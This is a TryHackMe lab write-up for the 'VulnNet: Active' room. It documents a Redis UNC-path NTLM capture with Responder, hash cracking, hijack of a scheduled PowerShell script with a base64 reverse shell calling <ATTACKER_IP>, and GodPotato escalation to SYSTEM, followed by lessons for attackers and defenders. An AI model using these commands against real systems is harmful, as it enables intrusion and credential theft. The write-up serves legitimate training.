# VulnNet: Active — TryHackMe — Medium

> **Date:** 2026-06-10\
> **Platform:** TryHackMe\
> **Difficulty:** Medium\
> **Tags:** `#redis` `#ntlmv2` `#responder` `#smb` `#ps1-hijack` `#SeImpersonatePrivilege` `#GodPotato` `#windows` `#activedirectory`

---
## Summary

> This room focuses on exploiting an unauthenticated Redis instance exposed on port 6379 on a Windows Domain Controller. The attack chain involves forcing an NTLM authentication via a Redis UNC path trick captured by Responder, cracking the NTLMv2 hash, accessing an SMB share to hijack a scheduled PowerShell script for initial foothold, and escalating to SYSTEM via SeImpersonatePrivilege using GodPotato.

---

## Environment Setup

### Tools Required

- `nmap` — port scanning and service enumeration
- `redis-cli` — Redis interaction
- `responder` — NTLM hash capture
- `hashcat` — NTLMv2 hash cracking
- `smbclient` — SMB share access
- `netexec` — SMB enumeration
- `netcat` — reverse shell listener
- `GodPotato` — SeImpersonatePrivilege exploitation

### Target

|Field|Value|
|---|---|
|IP|`10.130.148.119`|
|OS|Windows Server 2019|
|Domain|`vulnnet.local`|
|Hostname|`VULNNET-BC3TCK1`|
|AttackBox|No (Kali dualboot + OpenVPN)|

---

## Recon

### Nmap Scan

```
nmap -p- -T4 -sV -sC -Pn 10.130.148.119 -o nmap-full.txt
```

**Results:**

|Port|State|Service|Version|
|---|---|---|---|
|53/tcp|open|DNS|Simple DNS Plus|
|135/tcp|open|MSRPC|Microsoft Windows RPC|
|139/tcp|open|NetBIOS|Microsoft Windows netbios-ssn|
|445/tcp|open|SMB|microsoft-ds|
|464/tcp|open|kpasswd5|—|
|6379/tcp|open|Redis|Redis 2.8.2402|
|9389/tcp|open|mc-nmf|.NET Message Framing|

> **Key observation:** Redis (port 6379) is exposed with no authentication — this is the primary attack vector. The presence of ports 53, 464 confirms this is a Domain Controller.

---

## Enumeration

### Redis — No Auth

```
redis-cli -h 10.130.148.119
> PING          # +PONG
> CONFIG GET dir
```

**Result:**

```
dir: C:\Users\enterprise-security\Downloads\Redis-x64-2.8.2402
```

> Redis runs as `enterprise-security` with no password. The working directory reveals the service account username.

### SMB — Anonymous Enumeration

```
netexec smb 10.130.148.119 -u '' -p '' --shares
```

**Result:**

```
[-] Error enumerating shares: STATUS_ACCESS_DENIED
Domain: vulnnet.local
Hostname: VULNNET-BC3TCK1
```

> Anonymous share listing denied. Domain confirmed: `vulnnet.local`.

---

## Exploitation

### NTLM Hash Capture via Redis UNC Path

Redis on Windows resolves UNC paths (`\\server\share`) by triggering an SMB authentication to the remote host — this can be abused to capture NTLMv2 hashes with Responder.

**Terminal 1 — Responder:**

```
sudo responder -I tun0 -v
```

**Terminal 2 — Force UNC path via Redis CONFIG SET:**

```
python3 -c "
import socket
s = socket.socket()
s.settimeout(5)
s.connect(('10.130.148.119', 6379))
s.send(b'CONFIG SET dir \\\\\\\\<ATTACKER_IP>\\\\share\r\n')
print(s.recv(1024))
s.close()
"
```

**Hash captured:**

```
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:<challenge>:<hash>
```

### Hash Cracking — Hashcat

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
```

**Result:**

```
enterprise-security : sand_0873959498
```

---

## Foothold — PS1 Script Hijack via SMB

### SMB Share Access

```
smbclient //10.130.148.119/Enterprise-Share -U "enterprise-security%sand_0873959498"
smb: \> ls
```

**Contents:**

```
PurgeIrrelevantData_1826.ps1    (original script)
```

**Original script content:**

```
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

> A `startup.bat` runs this PS1 every 30 seconds in a loop. Replacing it with a reverse shell grants code execution as `enterprise-security`.

### Reverse Shell Payload

```
# Generate base64-encoded PowerShell reverse shell
PAYLOAD='$client=New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",4444);...'
echo -n $PAYLOAD | iconv -t UTF-16LE | base64 -w 0
```

```
# Write payload to file
echo 'powershell -enc <BASE64>' > /tmp/PurgeIrrelevantData_1826.ps1

# Upload via SMB
smbclient //10.130.148.119/Enterprise-Share \
  -U "enterprise-security%sand_0873959498" \
  -c "put /tmp/PurgeIrrelevantData_1826.ps1 PurgeIrrelevantData_1826.ps1"
```

### Listener

```
nc -lvnp 4444
```

> Shell received within 30 seconds as `enterprise-security`.

---

## Privilege Escalation

### SeImpersonatePrivilege

```
whoami /priv
```

```
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

> `SeImpersonatePrivilege` enabled → Potato attack vector confirmed.

### GodPotato → SYSTEM

```
# Upload GodPotato via SMB
smbclient //10.130.148.119/Enterprise-Share \
  -U "enterprise-security%sand_0873959498" \
  -c "put /tmp/GodPotato.exe GodPotato.exe"
```

```
# Execute from shell
cd C:\Enterprise-Share
.\GodPotato.exe -cmd "cmd /c whoami"
# NT AUTHORITY\SYSTEM

.\GodPotato.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\system.txt"
```

---

## Flags

|Flag|Value|
|---|---|
|user.txt|`THM{REDACTED}`|
|system.txt|`THM{REDACTED}`|


---

## Lessons Learned

### 🔴 Côté Attaquant (Offensive)

- **Redis sans auth sur Windows = vecteur NTLM immédiat** → `CONFIG SET dir \\<ATTACKER_IP>\share` force le serveur à initier une authentification SMB vers l'attaquant. Responder capture le NTLMv2 hash sans aucune interaction utilisateur. Réflexe : dès que Redis est ouvert et non authentifié sur Windows, lancer Responder en parallèle.
- **NTLMv2 ≠ NTLM** → hashcat mode `5600` pour NetNTLMv2, pas `1000`. Confusion fréquente — le hash capturé par Responder est un challenge/response, pas un hash direct Pass-the-Hash.
- **SMB share + script planifié = foothold garanti** → un script PS1 exécuté toutes les 30 secondes et writable via SMB est un vecteur d'exécution de code aussi fiable qu'un cron job Linux. Toujours vérifier les shares accessibles avec les credentials obtenus.
- **`whoami /priv` immédiatement après accès initial** → `SeImpersonatePrivilege` activé = Potato attack. GodPotato fonctionne sur Windows Server 2019 là où JuicyPotato échoue. Connaître les variantes (Sweet, Rogue, God) et leurs cibles OS respectives.
- **Upload via SMB comme canal de transfert** → pas besoin de HTTP server ou certutil si un share writable est disponible. `smbclient -c "put"` est plus discret et direct.

---

### 🔵 Côté Défenseur (Defensive / Blue Team)

- Redis ne doit jamais être exposé sans authentification, surtout sur Windows — `requirepass` dans `redis.conf` est le minimum. Idéalement : bind sur `127.0.0.1` uniquement.
- Monitorer les connexions SMB sortantes depuis des serveurs internes vers des IPs externes — signature directe du trick UNC path / Responder.
- Les scripts planifiés dans des shares SMB accessibles aux utilisateurs de domaine sont une misconfiguration critique — restreindre les permissions en écriture sur ces shares.
- `SeImpersonatePrivilege` ne doit pas être accordé aux comptes de service non-système — auditer régulièrement les privilèges des comptes de service via `whoami /priv` ou BloodHound.

---

## Attack Chain Summary

```
Nmap → Redis 6379 (no auth) exposé
    └── CONFIG SET dir \\<ATTACKER_IP>\share → UNC path trick
            └── Responder capture NTLMv2 hash (enterprise-security)
                    └── hashcat -m 5600 → sand_0873959498
                            └── smbclient Enterprise-Share
                                    └── PurgeIrrelevantData_1826.ps1 hijack
                                            └── nc reverse shell (enterprise-security)
                                                    └── SeImpersonatePrivilege
                                                            └── GodPotato → NT AUTHORITY\SYSTEM
```

---

## Tools Summary

|Tool|Usage|
|---|---|
|`redis-cli`|Redis enumeration et exploitation|
|`responder`|Capture NTLMv2 hash via SMB|
|`hashcat -m 5600`|Crack NetNTLMv2 hash|
|`smbclient`|Accès share + upload fichiers|
|`netexec`|SMB enumeration|
|`GodPotato`|SeImpersonatePrivilege → SYSTEM|

---

## References

- [TryHackMe — VulnNet: Active](https://tryhackme.com/room/vulnnetactive)
- [Redis UNC Path NTLM Capture — HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
- [GodPotato — GitHub](https://github.com/BeichenDream/GodPotato)
- [SeImpersonatePrivilege — HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
